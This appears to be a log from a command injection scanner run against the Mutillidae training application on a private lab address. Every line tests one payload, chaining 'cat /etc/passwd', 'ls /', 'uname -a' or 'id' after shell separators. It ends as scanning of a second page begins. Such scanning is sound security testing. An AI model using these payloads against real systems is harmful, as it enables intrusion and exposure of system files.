INFO - 
Starting ScanCommandInject scan
INFO - 	No forms found on http://192.168.232.129/mutillidae/index.php?page=arbitrary-file-inclusion.php. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \nls / on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &ls / on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |ls / on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )ls / on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;id on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \nid on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &id on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |id on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&id on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||id on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )id on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=source-viewer.php
